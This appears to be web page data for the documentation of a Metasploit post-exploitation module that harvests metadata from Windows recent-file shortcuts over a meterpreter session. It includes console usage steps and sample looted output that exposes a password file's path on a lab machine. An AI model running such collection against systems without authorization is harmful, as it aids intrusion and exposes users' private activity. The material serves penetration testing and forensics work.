{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/post/windows/gather/dumplinks","result":{"data":{"moduleMetadataJson":{"id":"9e795617-f1fa-5769-840a-d1d66f4cdeb7","name":"Windows Gather Dump Recent Files lnk Info","fullname":"post/windows/gather/dumplinks","description":"The dumplinks module is a modified port of Harlan Carvey's lslnk.pl Perl script.\n          This module will parse .lnk files from a user's Recent Documents folder\n          and Microsoft Office's Recent Documents folder, if present.\n          Windows creates these link files automatically for many common file types.\n          The .lnk files contain time stamps, file locations, including share\n          names, volume serial numbers, and more.","rank":300,"fields":{"detailsSlug":"/modules/details/post/windows/gather/dumplinks","documentationSlug":"/modules/documentation/post/windows/gather/dumplinks","referencesSlug":"/modules/references/post/windows/gather/dumplinks"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>  The dumplinks module is a modified port of Harlan Carvey's lslnk.pl Perl script. This module will parse .lnk files from a user's\nRecent Documents folder and Microsoft Office's Recent Documents folder, if present. Windows creates these link files automatically\nfor many common file types. The .lnk files contain time stamps, file locations, including share names, volume serial numbers, and more.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Start msfconsole</li>\n<li>Get meterpreter session</li>\n<li>Do: <code class=\"language-text\">use post/windows/gather/dumplinks</code></li>\n<li>Do: <code class=\"language-text\">set SESSION &lt;session id&gt;</code></li>\n<li>Do: <code class=\"language-text\">run</code></li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p>  <strong>SESSION</strong></p>\n<p>  The session to run the module on.</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"windows-7-61-build-7601-service-pack-1\" style=\"position:relative;\"><a href=\"#windows-7-61-build-7601-service-pack-1\" aria-label=\"windows 7 61 build 7601 service pack 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Windows 7 (6.1 Build 7601, Service Pack 1).</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">[*] Meterpreter session 1 opened (192.168.1.3:4444 -&gt; 192.168.1.10:49160) at 2019-12-11 15:45:16 -0700\n\nmsf &gt; use post/windows/gather/dumplinks\nmsf post(windows/gather/dumplinks) &gt; set SESSION 1\n  SESSION =&gt; 1\nmsf post(windows/gather/dumplinks) &gt; run\n\n  [*] Running module against TEST-PC\n  [*] Extracting lnk files for user TEST at C:\\Users\\TEST\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\...\n  [*] Processing: C:\\Users\\TEST\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\myPasswords.lnk.\n  [*] Processing: C:\\Users\\TEST\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\Network and Internet.lnk.\n  [*] No Recent Office files found for user TEST. Nothing to do.\n  [*] Post module execution completed</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h2 id=\"example-of-looted-lnk-output\" style=\"position:relative;\"><a href=\"#example-of-looted-lnk-output\" aria-label=\"example of looted lnk output permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Example of looted .lnk output</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">[*] exec: cat /root/.msf4/loot/20191211154832_default_192.168.1.10_host.windows.lnk_124491.txt\n\nC:\\Users\\TEST\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\myPasswords.lnk:\n        Access Time       = 2019-12-11 23:44:39 -0700\n        Creation Date     = 2019-12-11 23:44:39 -0700\n        Modification Time = 2019-12-11 23:44:39 -0700\nContents of C:\\Users\\TEST\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\myPasswords.lnk:\n        Flags:\n                Shell Item ID List exists.\n                Shortcut points to a file or directory.\n                The shortcut has a relative path string.\n                The shortcut has working directory.\n        Attributes:\n                Target was modified since last backup.\n        Target file&#39;s MAC Times stored in lnk file:\n                Creation Time     = 2019-12-11 23:44:30 -0700. (UTC)\n                Modification Time = 2019-12-11 23:44:30 -0700. (UTC)\n                Access Time       = 2019-12-11 23:44:30 -0700. (UTC)\n        ShowWnd value(s):\n                SW_NORMAL.\n                SW_SHOWMAXIMIZED.\n                SW_SHOW.\n                SW_SHOWMINNOACTIVE.\n                SW_RESTORE.\n      Target file&#39;s MAC Times stored in lnk file:\n                Creation Time     = 2019-12-11 23:44:30 -0700. (UTC)\n                Modification Time = 2019-12-11 23:44:30 -0700. (UTC)\n                Access Time       = 2019-12-11 23:44:30 -0700. (UTC)\n      Shortcut file is on a local volume.\n                Volume Name =\n                Volume Type = Fixed\n                Volume SN   = 0x548EF20B\n      Target path = C:\\Users\\TEST\\Desktop\\myPasswords.txt&amp;..\\..\\..\\..\\..\\Desktop\\myPasswords.txtC:\\Users\\TEST\\Desktop(\n    ```</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"9e795617-f1fa-5769-840a-d1d66f4cdeb7"}}}